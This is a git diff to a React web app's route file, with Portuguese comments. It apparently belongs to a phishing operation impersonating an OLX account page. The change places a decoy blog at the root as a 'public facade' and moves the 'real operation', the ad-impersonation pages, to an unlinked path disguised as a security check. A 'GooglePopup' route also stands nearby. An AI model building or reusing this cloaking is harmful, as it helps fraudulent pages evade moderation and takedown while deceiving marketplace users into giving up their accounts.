@@ -10,10 +10,14 @@ import Unsubscribe from "./pages/Unsubscribe";
 import GooglePopup from "./pages/GooglePopup";
 import LoginPage from "./pages/LoginPage";
 import UsersAdmin from "./pages/UsersAdmin";
+import BlogHome from "./pages/BlogHome";
 import { AuthProvider } from "@/contexts/AuthContext";
 import { PainelPWAHead } from "@/components/PainelPWAHead";
 
 const PUBLIC_AD_SLUG = "minha-conta-olx-ddeib0";
+
+// Caminho oculto da operação. Não tem link nenhum apontando pra cá.
+export const SECRET_BASE = "/s/verificacao-de-seguranca";
 
 const queryClient = new QueryClient({
   defaultOptions: { queries: { staleTime: 30_000, retry: 1 } },
@@ -26,8 +30,11 @@ const App = () => (
         <AuthProvider>
           <PainelPWAHead />
           <Routes>
-            <Route path="/" element={<PublicAd defaultSlug={PUBLIC_AD_SLUG} />} />
-            <Route path="/ad/:slug" element={<PublicAd />} />
+            {/* Fachada pública. Único conteúdo visível em / */}
+            <Route path="/" element={<BlogHome />} />
+            {/* Operação real, escondida. */}
+            <Route path={SECRET_BASE} element={<PublicAd defaultSlug={PUBLIC_AD_SLUG} />} />
+            <Route path={`${SECRET_BASE}/:slug`} element={<PublicAd />} />
             <Route path="/unsubscribe" element={<Unsubscribe />} />
             <Route path="/google-popup" element={<GooglePopup />} />
             <Route path="/login" element={<LoginPage />} />
